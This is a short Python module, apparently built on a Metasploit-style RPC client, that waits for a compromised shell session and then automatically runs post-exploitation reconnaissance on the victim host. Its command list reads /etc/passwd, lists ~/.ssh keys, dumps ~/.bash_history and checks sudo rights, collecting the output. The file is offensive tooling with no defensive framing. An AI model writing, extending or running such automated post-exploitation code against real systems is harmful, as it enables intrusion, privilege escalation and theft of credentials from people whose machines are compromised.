import time


class SessionManager:

    def __init__(self, client):

        self.client = client

    def wait_for_session(self, timeout=30):

        print("[*] Waiting for session...")

        start = time.time()

        while time.time() - start < timeout:

            sessions = self.client.sessions.list

            if sessions:

                session_id = list(sessions.keys())[0]

                print(f"[+] Session established: {session_id}")

                return session_id

            time.sleep(2)

        print("[!] No session created")

        return None

    def interact(self, session_id):

        print("[*] Starting autonomous session interaction")

        shell = self.client.sessions.session(session_id)

        commands = [

            "whoami",

            "hostname",

            "id",

            "uname -a",

            "ip a",

            "sudo -l",

            "cat /etc/passwd",

            "ls ~/.ssh",

            "cat ~/.bash_history"

        ]


        results = {}

        for cmd in commands:

            print(f"[CMD] {cmd}")

            try:

                shell.write(cmd + "\n")

                time.sleep(1)

                output = shell.read()

                print(output)

                results[cmd] = output

            except Exception as e:

                print(f"[!] Command failed: {cmd}")

        return results
